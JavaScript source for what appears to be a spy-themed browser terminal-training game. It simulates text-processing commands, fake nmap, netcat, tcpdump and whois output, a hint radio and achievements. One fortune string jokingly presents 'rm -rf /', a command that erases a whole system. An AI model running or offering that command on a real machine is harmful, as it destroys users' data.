        const delimiterIdx = args.indexOf('-d');
        const fieldIdx = args.indexOf('-f');
        const charIdx = args.indexOf('-c');

        let delimiter = '\t';
        let fields = null;
        let chars = null;

        if (delimiterIdx !== -1 && args[delimiterIdx + 1]) {
            delimiter = args[delimiterIdx + 1].replace(/['"]/g, '');
        }
        if (fieldIdx !== -1 && args[fieldIdx + 1]) {
            fields = args[fieldIdx + 1];
        }
        if (charIdx !== -1 && args[charIdx + 1]) {
            chars = args[charIdx + 1];
        }

        const file = args.filter(a => !a.startsWith('-') && !a.includes(delimiter) && !/^\d/.test(a))[0];

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `cut: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `cut: ${file}: Is a directory`;
            content = entry.content || '';
        }

        if (!content) return '';

        const lines = content.split('\n');
        const result = [];

        for (const line of lines) {
            if (chars) {
                // Character extraction
                const range = this._parseRange(chars, line.length);
                result.push(range.map(i => line[i - 1] || '').join(''));
            } else if (fields) {
                // Field extraction
                const parts = line.split(delimiter);
                const range = this._parseRange(fields, parts.length);
                result.push(range.map(i => parts[i - 1] || '').join(delimiter));
            } else {
                result.push(line);
            }
        }

        return result.join('\n');
    }

    _parseRange(spec, max) {
        const result = [];
        const parts = spec.split(',');

        for (const part of parts) {
            if (part.includes('-')) {
                const [start, end] = part.split('-');
                const s = start ? parseInt(start) : 1;
                const e = end ? parseInt(end) : max;
                for (let i = s; i <= Math.min(e, max); i++) {
                    if (!result.includes(i)) result.push(i);
                }
            } else {
                const n = parseInt(part);
                if (n >= 1 && n <= max && !result.includes(n)) {
                    result.push(n);
                }
            }
        }

        return result.sort((a, b) => a - b);
    }

    _cmdTr(args, pipeInput = null) {
        if (args.length < 2) return 'tr: missing operand';

        const deleteMode = args[0] === '-d';
        const squeezeMode = args[0] === '-s';

        let set1, set2;
        if (deleteMode || squeezeMode) {
            set1 = (args[1] || '').replace(/['"]/g, '');
            set2 = (args[2] || '').replace(/['"]/g, '');
        } else {
            set1 = (args[0] || '').replace(/['"]/g, '');
            set2 = (args[1] || '').replace(/['"]/g, '');
        }

        let content = pipeInput || '';
        if (!content) return 'tr: no input (requires pipe)';

        // Expand character classes
        set1 = this._expandCharClass(set1);
        set2 = this._expandCharClass(set2);

        if (deleteMode) {
            // Delete characters in set1
            const regex = new RegExp(`[${this._escapeRegex(set1)}]`, 'g');
            return content.replace(regex, '');
        } else if (squeezeMode) {
            // Squeeze repeated characters
            let result = content;
            for (const char of set1) {
                const regex = new RegExp(`${this._escapeRegex(char)}+`, 'g');
                result = result.replace(regex, char);
            }
            return result;
        } else {
            // Translate characters
            let result = '';
            for (const char of content) {
                const idx = set1.indexOf(char);
                if (idx !== -1 && set2[idx]) {
                    result += set2[idx] || set2[set2.length - 1] || char;
                } else {
                    result += char;
                }
            }
            return result;
        }
    }

    _expandCharClass(str) {
        return str
            .replace(/a-z/g, 'abcdefghijklmnopqrstuvwxyz')
            .replace(/A-Z/g, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')
            .replace(/0-9/g, '0123456789')
            .replace(/\\n/g, '\n')
            .replace(/\\t/g, '\t');
    }

    _escapeRegex(str) {
        return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    }

    _cmdSed(args, pipeInput = null) {
        if (args.length < 1) return 'sed: no input files';

        const expression = args[0].replace(/['"]/g, '');
        const file = args.filter(a => !a.startsWith('-') && a !== expression)[0];

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `sed: can't read ${file}: No such file or directory`;
            if (entry.type !== 'file') return `sed: ${file}: Is a directory`;
            content = entry.content || '';
        } else if (!content) {
            return 'sed: no input file or pipe';
        }

        if (!content) return '';

        // Parse s/pattern/replacement/flags
        const match = expression.match(/^s\/(.+?)\/(.*)\/([gi]*)$/);
        if (match) {
            const [, pattern, replacement, flags] = match;
            const regex = new RegExp(pattern, flags.includes('g') ? 'g' : '');

            if (flags.includes('g')) {
                return content.replace(regex, replacement);
            } else {
                // Line-by-line replacement (default sed behavior)
                return content.split('\n').map(line =>
                    line.replace(regex, replacement)
                ).join('\n');
            }
        }

        // Support d for delete
        if (expression.match(/^\/.*\/d$/)) {
            const pattern = expression.slice(1, -2);
            const regex = new RegExp(pattern);
            return content.split('\n').filter(line => !regex.test(line)).join('\n');
        }

        // Support p for print (with -n)
        if (expression.match(/^\/.*\/p$/) && args.includes('-n')) {
            const pattern = expression.slice(1, -2);
            const regex = new RegExp(pattern);
            return content.split('\n').filter(line => regex.test(line)).join('\n');
        }

        return content;
    }

    _cmdAwk(args, pipeInput = null) {
        if (args.length < 1) return 'awk: no program given';

        // Parse -F field separator
        const fieldSepIdx = args.indexOf('-F');
        let fieldSep = ' ';
        if (fieldSepIdx !== -1) {
            if (!args[fieldSepIdx + 1] || args[fieldSepIdx + 1].startsWith('-')) {
                return 'awk: missing field separator';
            }
            fieldSep = args[fieldSepIdx + 1].replace(/['"]/g, '');
        }

        // Find the awk program (must contain { or $ for patterns)
        const program = args.find(a => a.includes('{') || a.includes('$'))?.replace(/['"]/g, '');
        if (!program) {
            return 'awk: no program given\nUsage: awk [-F sep] \'pattern\' [file]\nExample: awk -F: \'{print $1}\' /etc/passwd';
        }

        // Find input file (not a flag, not the separator, not the program)
        const file = args.filter(a => !a.startsWith('-') && !a.includes('{') && !a.includes('$') && a !== fieldSep)[0];

        // Get content from pipe or file
        let content = pipeInput || '';
        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `awk: can't open file ${file}`;
            if (entry.type !== 'file') return `awk: ${file}: Is a directory`;
            content = entry.content || '';
        } else if (!content) {
            return 'awk: no input file or pipe';
        }

        if (!content) return '';

        const lines = content.split('\n');
        const result = [];

        // Simple awk patterns: {print $1}, {print $1, $2}, {print $0}, etc.
        const printMatch = program.match(/\{print\s+(.+)\}/);
        if (printMatch) {
            const fields = printMatch[1].split(/,\s*/);

            for (const line of lines) {
                if (!line) continue;
                const parts = line.split(fieldSep === ' ' ? /\s+/ : fieldSep);
                const output = fields.map(f => {
                    f = f.trim();
                    if (f === '$0') return line;
                    if (f === 'NF') return parts.length;
                    if (f === 'NR') return lines.indexOf(line) + 1;
                    const match = f.match(/^\$(\d+)$/);
                    if (match) {
                        const idx = parseInt(match[1]);
                        return idx === 0 ? line : (parts[idx - 1] || '');
                    }
                    return f.replace(/['"]/g, '');
                }).join(' ');
                result.push(output);
            }
        } else {
            // Just return content if pattern not understood
            return content;
        }

        return result.join('\n');
    }

    _cmdTee(args, pipeInput = null) {
        const append = args.includes('-a');
        const files = args.filter(a => !a.startsWith('-'));

        const content = pipeInput || '';
        if (!content) return 'tee: no input (requires pipe)';

        // Write to files
        for (const file of files) {
            const resolved = this._resolvePath(file);
            const parentPath = resolved.substring(0, resolved.lastIndexOf('/')) || '/';
            const fileName = resolved.substring(resolved.lastIndexOf('/') + 1);

            if (this.fs[parentPath]?.type === 'dir') {
                if (append && this.fs[resolved]) {
                    this.fs[resolved].content = (this.fs[resolved].content || '') + content;
                } else {
                    this.fs[resolved] = {
                        type: 'file',
                        content: content,
                        perms: '-rw-r--r--',
                        owner: this.user,
                        group: this.user
                    };
                    if (!this.fs[parentPath].children.includes(fileName)) {
                        this.fs[parentPath].children.push(fileName);
                    }
                }
            }
        }

        // Also output to stdout
        return content;
    }

    _cmdXargs(args) {
        const command = args[0] || 'echo';
        const content = this.pipeInput || '';

        if (!content) return '';

        const items = content.split(/\s+/).filter(i => i);

        // Simple xargs simulation - run command with all items as args
        if (command === 'echo') {
            return items.join(' ');
        } else if (command === 'rm') {
            for (const item of items) {
                const resolved = this._resolvePath(item);
                if (this.fs[resolved]) {
                    delete this.fs[resolved];
                }
            }
            return '';
        } else {
            // Generic handling - just show what would run
            return `${command} ${items.join(' ')}`;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // CRYPTO/ENCODING COMMANDS
    // ═══════════════════════════════════════════════════════════════

    _cmdBase64(args) {
        const decode = args.includes('-d') || args.includes('--decode');
        const file = args.filter(a => !a.startsWith('-'))[0];

        let content = this.pipeInput || '';
        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `base64: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `base64: ${file}: Is a directory`;
            content = entry.content || '';
        }

        if (!content) return '';

        try {
            if (decode) {
                return atob(content.trim());
            } else {
                return btoa(content);
            }
        } catch (e) {
            return `base64: invalid input`;
        }
    }

    _cmdMd5sum(args) {
        const file = args.filter(a => !a.startsWith('-'))[0];

        let content = this.pipeInput || '';
        let filename = '-';

        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `md5sum: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `md5sum: ${file}: Is a directory`;
            content = entry.content || '';
            filename = file;
        }

        // Simple hash simulation (not real MD5, but consistent for same input)
        const hash = this._simpleHash(content, 32);
        return `${hash}  ${filename}`;
    }

    _cmdSha256sum(args) {
        const file = args.filter(a => !a.startsWith('-'))[0];

        let content = this.pipeInput || '';
        let filename = '-';

        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `sha256sum: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `sha256sum: ${file}: Is a directory`;
            content = entry.content || '';
            filename = file;
        }

        const hash = this._simpleHash(content, 64);
        return `${hash}  ${filename}`;
    }

    _cmdSha1sum(args) {
        const file = args.filter(a => !a.startsWith('-'))[0];

        let content = this.pipeInput || '';
        let filename = '-';

        if (file) {
            const resolved = this._resolvePath(file);
            const entry = this.fs[resolved];
            if (!entry) return `sha1sum: ${file}: No such file or directory`;
            if (entry.type !== 'file') return `sha1sum: ${file}: Is a directory`;
            content = entry.content || '';
            filename = file;
        }

        const hash = this._simpleHash(content, 40);
        return `${hash}  ${filename}`;
    }

    _simpleHash(str, length) {
        // Generate a consistent hex string based on input
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }

        // Convert to hex and pad/extend to desired length
        let hex = Math.abs(hash).toString(16);
        while (hex.length < length) {
            hex = hex + Math.abs(hash * (hex.length + 1)).toString(16);
        }
        return hex.slice(0, length);
    }

    _cmdStrings(args) {
        const minLen = 4; // Default minimum string length
        const file = args.filter(a => !a.startsWith('-'))[0];

        if (!file) return 'strings: no file specified';

        const resolved = this._resolvePath(file);
        const entry = this.fs[resolved];
        if (!entry) return `strings: ${file}: No such file or directory`;
        if (entry.type !== 'file') return `strings: ${file}: Is a directory`;

        const content = entry.content || '';

        // Simulate finding printable strings
        const strings = [];
        let current = '';

        for (const char of content) {
            if (char.match(/[\x20-\x7E]/)) {
                current += char;
            } else {
                if (current.length >= minLen) {
                    strings.push(current);
                }
                current = '';
            }
        }

        if (current.length >= minLen) {
            strings.push(current);
        }

        return strings.join('\n');
    }

    // ═══════════════════════════════════════════════════════════════
    // SECURITY/RECON COMMANDS
    // ═══════════════════════════════════════════════════════════════

    _cmdNmap(args) {
        const target = args.filter(a => !a.startsWith('-'))[0];
        const allPorts = args.includes('-p-');
        const serviceVersion = args.includes('-sV');
        const osDetect = args.includes('-O');
        const aggressive = args.includes('-A');

        if (!target) return 'Nmap: No target specified';

        const ports = [
            { port: 22, state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu' },
            { port: 80, state: 'open', service: 'http', version: 'Apache httpd 2.4.41' },
            { port: 443, state: 'open', service: 'ssl/http', version: 'Apache httpd 2.4.41' },
            { port: 3306, state: 'open', service: 'mysql', version: 'MySQL 8.0.23' },
            { port: 8080, state: 'filtered', service: 'http-proxy', version: '' }
        ];

        let output = `Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for ${target}
Host is up (0.0023s latency).
`;

        if (allPorts) {
            output += `Not shown: 65530 closed ports\n`;
        }

        output += `\nPORT     STATE    SERVICE`;
        if (serviceVersion || aggressive) output += `     VERSION`;
        output += `\n`;

        for (const p of ports) {
            const portStr = `${p.port}/tcp`.padEnd(9);
            const stateStr = p.state.padEnd(9);
            const serviceStr = p.service.padEnd(12);
            output += `${portStr}${stateStr}${serviceStr}`;
            if ((serviceVersion || aggressive) && p.version) {
                output += p.version;
            }
            output += `\n`;
        }

        if (osDetect || aggressive) {
            output += `
OS details: Linux 5.15 - 5.19
Network Distance: 1 hop`;
        }

        output += `
Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds`;

        return output;
    }

    _cmdNetcat(args) {
        const listen = args.includes('-l');
        const verbose = args.includes('-v');
        const port = args.filter(a => /^\d+$/.test(a))[0];
        const host = args.filter(a => !a.startsWith('-') && !/^\d+$/.test(a))[0];

        if (listen) {
            if (!port) return 'nc: missing port number';
            return `Listening on 0.0.0.0 ${port}`;
        }

        if (!host) return 'nc: missing host';
        if (!port) return 'nc: missing port';

        return `Connection to ${host} ${port} port [tcp/*] succeeded!`;
    }

    _cmdTcpdump(args) {
        const interface_ = args.includes('-i') ? args[args.indexOf('-i') + 1] : 'eth0';
        const count = args.includes('-c') ? parseInt(args[args.indexOf('-c') + 1]) : 5;
        const verbose = args.includes('-v');

        let output = `tcpdump: listening on ${interface_}, link-type EN10MB (Ethernet), capture size 262144 bytes\n`;

        const packets = [
            { time: '10:30:01.234567', src: '192.168.1.100', dst: '8.8.8.8', proto: 'UDP', info: 'DNS query' },
            { time: '10:30:01.235123', src: '8.8.8.8', dst: '192.168.1.100', proto: 'UDP', info: 'DNS response' },
            { time: '10:30:01.456789', src: '192.168.1.100', dst: '93.184.216.34', proto: 'TCP', info: 'SYN' },
            { time: '10:30:01.478901', src: '93.184.216.34', dst: '192.168.1.100', proto: 'TCP', info: 'SYN-ACK' },
            { time: '10:30:01.479012', src: '192.168.1.100', dst: '93.184.216.34', proto: 'TCP', info: 'ACK' },
            { time: '10:30:01.512345', src: '192.168.1.100', dst: '93.184.216.34', proto: 'TCP', info: 'HTTP GET /' },
            { time: '10:30:01.612345', src: '93.184.216.34', dst: '192.168.1.100', proto: 'TCP', info: 'HTTP 200 OK' }
        ];

        for (let i = 0; i < Math.min(count, packets.length); i++) {
            const p = packets[i];
            output += `${p.time} IP ${p.src} > ${p.dst}: ${p.proto} ${p.info}\n`;
        }

        output += `\n${Math.min(count, packets.length)} packets captured`;
        return output;
    }

    _cmdWhois(args) {
        const domain = args.filter(a => !a.startsWith('-'))[0];

        if (!domain) return 'whois: missing domain';

        return `Domain Name: ${domain.toUpperCase()}
Registry Domain ID: 12345678_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.example.com
Registrar URL: http://www.example.com
Updated Date: 2024-01-15T00:00:00Z
Creation Date: 2000-01-01T00:00:00Z
Registry Expiry Date: 2025-01-01T00:00:00Z
Registrar: Example Registrar, Inc.
Registrar IANA ID: 1234
Registrar Abuse Contact Email: abuse@example.com
Registrar Abuse Contact Phone: +1.5551234567
Domain Status: clientTransferProhibited
Name Server: NS1.EXAMPLE.COM
Name Server: NS2.EXAMPLE.COM
DNSSEC: unsigned
>>> Last update of whois database: ${new Date().toISOString()} <<<`;
    }

    // ═══════════════════════════════════════════════════════════════
    // EASTER EGG COMMANDS
    // ═══════════════════════════════════════════════════════════════

    _cmdSl() {
        return `
                          (  ) (@@) ( )  (@)  ()    @@    O     @     O     @
                     (@@@)
                 (    )
              (@@@@)
            (   )
        ====        ________                ___________
    _D _|  |_______/        \\__I_I_____===__|_________|
     |(_)---  |   H\\________/ |   |        =|___ ___|
     /     |  |   H  |  |     |   |         ||_| |_||
    |      |  |   H  |__--------------------| [___] |
    | ________|___H__/__|_____/[][]~\\_______|       |
    |/ |   |-----------I_____I [][] []  D   |=======|
  __/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__
 |/-=|___|=    ||    ||    ||    |_____/~\\___/
  \\_/      \\O=====O=====O=====O_/      \\_/

You've been trained!
(Try typing 'ls' instead of 'sl' next time!)`;
    }

    _cmdCowsay(args) {
        const message = args.join(' ') || 'Moo!';
        const borderLen = message.length + 2;
        const top = ' ' + '_'.repeat(borderLen);
        const bottom = ' ' + '-'.repeat(borderLen);

        return `${top}
< ${message} >
${bottom}
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||`;
    }

    _cmdFortune() {
        const fortunes = [
            "The best way to predict the future is to create it.",
            "In the middle of difficulty lies opportunity.",
            "The only way to do great work is to love what you do.",
            "chmod 777 is not a security strategy.",
            "There's no place like 127.0.0.1",
            "To understand recursion, you must first understand recursion.",
            "A good programmer is someone who looks both ways before crossing a one-way street.",
            "Programming is like writing a book... except if you miss a single comma on page 126 the whole thing makes no sense.",
            "The cloud is just someone else's computer.",
            "Have you tried turning it off and on again?",
            "rm -rf / -- The ultimate minimalist approach to system administration.",
            "There are only 10 types of people: those who understand binary and those who don't.",
            "I'm not lazy, I'm on energy-saving mode.",
            "Weeks of coding can save you hours of planning.",
            "It works on my machine!",
            "sudo make me a sandwich"
        ];
        return fortunes[Math.floor(Math.random() * fortunes.length)];
    }

    // ═══════════════════════════════════════════════════════════════
    // RADIO SYSTEM - THE WATCHER
    // ═══════════════════════════════════════════════════════════════

    _cmdTune(args) {
        if (!args || args.length === 0) {
            return `[RADIO] Current frequency: ${this.radio.frequency} MHz (${this.radio.channels[this.radio.frequency]?.name || 'UNKNOWN'})
Usage: tune <frequency> or tune <channel-name>
       tune 161.7   - tune to specific frequency
       tune ghost   - tune to channel by name
       scan         - scan for active frequencies`;
        }

        let freq = args[0];

        // Check if it's an alias (name like "ghost" or "security")
        if (this.radio.aliases[freq.toLowerCase()]) {
            freq = this.radio.aliases[freq.toLowerCase()];
        } else {
            freq = parseFloat(freq);
        }

        const channel = this.radio.channels[freq];

        if (!channel) {
            return `[RADIO] No signal on ${args[0]}
...static...
[SIGNAL LOST]`;
        }

        this.radio.frequency = freq;
        return this._broadcastChannel(freq);
    }

    _cmdScan() {
        let output = `[SCANNING FREQUENCIES...]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

        for (const [freq, channel] of Object.entries(this.radio.channels)) {
            const signalStrength = this._getSignalStrength(channel.type);
            const marker = parseFloat(freq) === this.radio.frequency ? ' ◄──' : '';
            output += `\n${freq.toString().padEnd(7)} MHz  [${signalStrength}]  ${channel.name}${marker}`;
        }

        output += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[Use 'tune <frequency>' to listen]`;

        return output;
    }

    _cmdRadio(args) {
        // Alias for tune or show status
        if (!args || args.length === 0) {
            return this._cmdScan();
        }
        return this._cmdTune(args);
    }

    _getSignalStrength(type) {
        const strengths = {
            'noise': '░░░░░░░░░░',
            'ambient': '████░░░░░░',
            'lore': '██████░░░░',
            'hints': '████████░░',
            'easter': '██████░░░░',
            'solutions': '██████████'
        };
        return strengths[type] || '░░░░░░░░░░';
    }

    _broadcastChannel(freq) {
        const channel = this.radio.channels[freq];
        if (!channel) return '[NO SIGNAL]';

        const header = `[RADIO - ${freq} MHz - ${channel.name}]`;

        switch(channel.type) {
            case 'noise':
                return `${header}
...kssshhh...
...static...
...kssshhh...
[NO CLEAR SIGNAL]`;

            case 'ambient':
                return this._getSecurityChatter(header);

            case 'lore':
                return this._getConsortiumBroadcast(header);

            case 'hints':
                return this._getGhostBroadcast(header);

            case 'easter':
                return this._getNumbersStation(header);

            case 'solutions':
                return this._getEmergencyBroadcast(header);

            default:
                return `${header}\n[UNKNOWN SIGNAL TYPE]`;
        }
    }

    _getSecurityChatter(header) {
        const chatter = [
            '"Checkpoint alpha, all clear"',
            '"Copy that. Patrol rotating to floor 2"',
            '"Eyes on the ballroom. VIPs arriving."',
            '"Service elevator locked down."',
            '"Perimeter secure. No movement."'
        ];
        const msg1 = chatter[Math.floor(Math.random() * chatter.length)];
        const msg2 = chatter[Math.floor(Math.random() * chatter.length)];

        return `${header}
${msg1}
...
${msg2}
[SECURITY CHANNEL - ACTIVE]`;
    }

    _getConsortiumBroadcast(header) {
        const messages = [
            '██████ ENCRYPTED ██████',
            '"...the asset is in position..."',
            '...burst transmission...',
            '"...RAVEN confirms timeline..."',
            '██████ SCRAMBLED ██████',
            '"...summit proceeds as planned..."'
        ];
        const msg = messages[Math.floor(Math.random() * messages.length)];

        return `${header}
...encrypted burst detected...
${msg}
...signal scrambled...
[CONSORTIUM FREQUENCY - ENCRYPTED]`;
    }

    _getGhostBroadcast(header) {
        // Context-aware hints based on current objective
        const currentObj = this._getCurrentObjective();
        const moduleConfig = this.config;

        // Get hints from module config if available
        let hints = [];
        if (moduleConfig && moduleConfig.radio && moduleConfig.radio.ghost) {
            hints = moduleConfig.radio.ghost;
        } else {
            // Fallback generic hints
            hints = [
                '"...if you\'re hearing this, you\'re not alone..."',
                '"...we\'ve been where you are..."',
                '"...check your hidden files... ls -a..."',
                '"...the answer is often in plain sight..."',
                '"...read carefully. every detail matters..."'
            ];
        }

        // Add objective-specific hint if available
        if (currentObj && currentObj.watcher) {
            hints.unshift(`"...${currentObj.watcher.ghost || currentObj.hint}..."`);
        }

        const hint = hints[Math.floor(Math.random() * hints.length)];

        return `${header}
╔════════════════════════════════════════════╗
║  ...signal locked...                       ║
║                                            ║
║  ${hint.padEnd(40)} ║
║                                            ║
║  ...we're watching...           -GHOST-7   ║
╚════════════════════════════════════════════╝`;
    }

    _getNumbersStation(header) {
        // Creepy numbers station broadcast
        const sequences = [
            '7... 4... 9... 2... 7... 4... 9... 2...',
            '3... 3... 1... 8... 3... 3... 1... 8...',
            '9... 0... 2... 1... 5... 9... 0... 2...',
            '2... 0... 3... 0... 2... 0... 3... 0...'
        ];
        const seq = sequences[Math.floor(Math.random() * sequences.length)];

        return `${header}
...
...
${seq}
...
${seq}
...
[NUMBERS STATION - UNKNOWN ORIGIN]`;
    }

    _getEmergencyBroadcast(header) {
        // More direct solutions for truly stuck users
        const currentObj = this._getCurrentObjective();

        let solution = '"...no active emergency broadcast..."';

        if (currentObj) {
            if (currentObj.watcher && currentObj.watcher.mayday) {
                solution = currentObj.watcher.mayday;
            } else if (currentObj.hint) {
                solution = currentObj.hint;
            }
        }

        return `${header}
╔════════════════════════════════════════════════════╗
║  ⚠  EMERGENCY BROADCAST - BURNING THIS CHANNEL  ⚠ ║
╠════════════════════════════════════════════════════╣
║                                                    ║
║  ${solution.substring(0, 46).padEnd(46)} ║
║                                                    ║
║  This channel is now compromised.                  ║
║  A real operative finds another way.               ║
║                                                    ║
║                              [SIGNAL TERMINATED]   ║
╚════════════════════════════════════════════════════╝`;
    }

    _getCurrentObjective() {
        // Find first incomplete objective
        for (const obj of this.objectives) {
            if (!this.objectivesCompleted[obj.id]) {
                return obj;
            }
        }
        return null;
    }

    _checkWatcherKeywords(cmdLine) {
        const input = cmdLine.toLowerCase().trim();

        // Trigger words that summon the watcher
        const triggers = ['help', 'stuck', 'sos', 'hint', '?', 'help me', "i'm stuck", 'im stuck'];

        // Check if input IS a trigger (not just contains it)
        // We want "help" but not "grep help"
        const isDirectTrigger = triggers.some(t => input === t || input === t + '!');

        if (!isDirectTrigger) return null;

        // The watcher responds
        const responses = [
            `[signal intercept]
> ...we see you...
> tune your radio to 161.7
> there are others who can help
> -W`,
            `[watching]
> you're not alone in this
> scan the frequencies
> 161.7 MHz... remember it
> -S`,
            `[received]
> someone left you something
> check hidden files... or
> tune 161.7 for guidance
> -G`,
            `[intercept detected]
> the ghost frequency: 161.7
> tune in when you need us
> we've been where you are
> -W`
        ];

        return responses[Math.floor(Math.random() * responses.length)];
    }

    _cmdCmatrix() {
        const width = 60;
        const height = 15;
        let matrix = '';

        for (let i = 0; i < height; i++) {
            let row = '';
            for (let j = 0; j < width; j++) {
                const char = Math.random() > 0.5 ? (Math.random() > 0.5 ? '1' : '0') : ' ';
                row += char;
            }
            matrix += row + '\n';
        }

        return `[Matrix rain simulation - press Ctrl+C to stop]
${matrix}
(In a real terminal, this would animate!)`;
    }

    _cmdFiglet(args) {
        const text = args.join(' ') || 'Hello';

        // Simple ASCII art letters
        const letters = {
            'H': ['#   # ', '#   # ', '##### ', '#   # ', '#   # '],
            'E': ['##### ', '#     ', '####  ', '#     ', '##### '],
            'L': ['#     ', '#     ', '#     ', '#     ', '##### '],
            'O': [' ### ', '#   # ', '#   # ', '#   # ', ' ### '],
            'W': ['#   # ', '#   # ', '# # # ', '## ## ', '#   # '],
            'R': ['####  ', '#   # ', '####  ', '#  #  ', '#   # '],
            'D': ['####  ', '#   # ', '#   # ', '#   # ', '####  '],
            ' ': ['  ', '  ', '  ', '  ', '  ']
        };

        const lines = ['', '', '', '', ''];
        for (const char of text.toUpperCase()) {
            const art = letters[char] || letters[' '];
            for (let i = 0; i < 5; i++) {
                lines[i] += art[i] || '      ';
            }
        }

        return lines.join('\n');
    }

    _cmdLolcat(args) {
        const text = args.join(' ') || this.pipeInput || '';
        // In a real terminal this would colorize the output
        return `🌈 ${text} 🌈
(In a real terminal, this would be rainbow colored!)`;
    }

    _cmdHollywood() {
        return `
╔════════════════════════════════════════════════════════════════╗
║                    INITIALIZING HACK SEQUENCE                   ║
╠════════════════════════════════════════════════════════════════╣
║ [████████████████████████████████████████] 100% COMPLETE        ║
║                                                                 ║
║ > Bypassing firewall.......... OK                               ║
║ > Decrypting passwords........ OK                               ║
║ > Accessing mainframe......... OK                               ║
║ > Downloading all the things.. OK                               ║
║ > Installing backdoor......... OK                               ║
║                                                                 ║
║                    ★ ACCESS GRANTED ★                           ║
║                                                                 ║
║  Just kidding! This is just for fun.                            ║
║  Real hacking looks like reading logs and drinking coffee.       ║
╚════════════════════════════════════════════════════════════════╝`;
    }

    // ═══════════════════════════════════════════════════════════════
    // ACHIEVEMENT SYSTEM
    // ═══════════════════════════════════════════════════════════════

    _loadAchievements() {
        try {
            const saved = localStorage.getItem('clh_achievements');
            return saved ? JSON.parse(saved) : {};
        } catch (e) {
            return {};
        }
    }

    _saveAchievements() {
        try {
            localStorage.setItem('clh_achievements', JSON.stringify(this._achievements));
        } catch (e) {
            // Storage not available
        }
    }

    _unlockAchievement(id) {
        if (this._achievements[id]) return; // Already unlocked

        const achievements = {
            'first_command': { name: 'First Steps', icon: '🌱', desc: 'Run your first command' },
            'pipeline_master': { name: 'Pipeline Master', icon: '🔗', desc: 'Use 3+ pipes in one command' },
            'speed_demon': { name: 'Speed Demon', icon: '⚡', desc: 'Complete a module in under 2 minutes' },
            'tab_master': { name: 'Tab Master', icon: '⌨️', desc: 'Use tab completion 50 times' },
            'history_buff': { name: 'History Buff', icon: '📜', desc: 'Successfully use Ctrl+R search' },
            'vim_survivor': { name: 'Vim Survivor', icon: '🏆', desc: 'Exit vim gracefully with :wq' },
            'wildcard_wizard': { name: 'Wildcard Wizard', icon: '✨', desc: 'Use wildcards in 10 commands' },
            'redirect_pro': { name: 'Redirect Pro', icon: '➡️', desc: 'Use >, >>, and < operators' },
            'easter_hunter': { name: 'Easter Egg Hunter', icon: '🥚', desc: 'Discover 5 hidden commands' },
            'job_juggler': { name: 'Job Juggler', icon: '🎪', desc: 'Use job control (Ctrl+Z, fg, bg)' }
        };

        const achievement = achievements[id];
        if (!achievement) return;

        this._achievements[id] = {
            unlockedAt: new Date().toISOString(),
            ...achievement
        };
        this._saveAchievements();

        // Show achievement notification
        this._showAchievementNotification(achievement);
    }

    _showAchievementNotification(achievement) {
        const notification = document.createElement('div');
        notification.className = 'clh-achievement-popup';
        notification.innerHTML = `
            <div class="clh-achievement-icon">${achievement.icon}</div>
            <div class="clh-achievement-text">
                <div class="clh-achievement-title">Achievement Unlocked!</div>
                <div class="clh-achievement-name">${achievement.name}</div>
            </div>
        `;

        // Add styles if not present
        if (!document.querySelector('#clh-achievement-styles')) {
            const style = document.createElement('style');
            style.id = 'clh-achievement-styles';
            style.textContent = `
                .clh-achievement-popup {
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    background: linear-gradient(135deg, #1a1a2e, #16213e);
                    border: 2px solid #fbbf24;
                    border-radius: 12px;
                    padding: 15px 20px;
                    display: flex;
                    align-items: center;
                    gap: 15px;
                    z-index: 10000;
                    animation: clh-achievement-slide 0.5s ease-out, clh-achievement-fade 0.5s ease-out 3s forwards;
                    box-shadow: 0 4px 20px rgba(251, 191, 36, 0.3);
                }
                .clh-achievement-icon { font-size: 2.5em; }
                .clh-achievement-title {
                    color: #fbbf24;
                    font-size: 0.8em;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }
                .clh-achievement-name {
                    color: #fff;
                    font-size: 1.2em;
                    font-weight: bold;
                }
                @keyframes clh-achievement-slide {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes clh-achievement-fade {
                    to { opacity: 0; transform: translateY(20px); }
                }
            `;
            document.head.appendChild(style);
        }

        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 4000);
    }

    _trackAchievements(cmdLine) {
        const stats = this._achievementStats;
        stats.commandCount++;

        // First command
        if (stats.commandCount === 1) {
            this._unlockAchievement('first_command');
        }

        // Pipeline master (3+ pipes)
        const pipeCount = (cmdLine.match(/\|/g) || []).length;
        if (pipeCount >= 3) {
            this._unlockAchievement('pipeline_master');
        }

        // Wildcard usage
        if (/[*?]/.test(cmdLine) || /\{.*,.*\}/.test(cmdLine)) {
            stats.wildcardCount++;
            if (stats.wildcardCount >= 10) {
                this._unlockAchievement('wildcard_wizard');
            }
        }

        // Redirect usage
        if (/>(?!>)/.test(cmdLine)) stats.redirectCount |= 1;
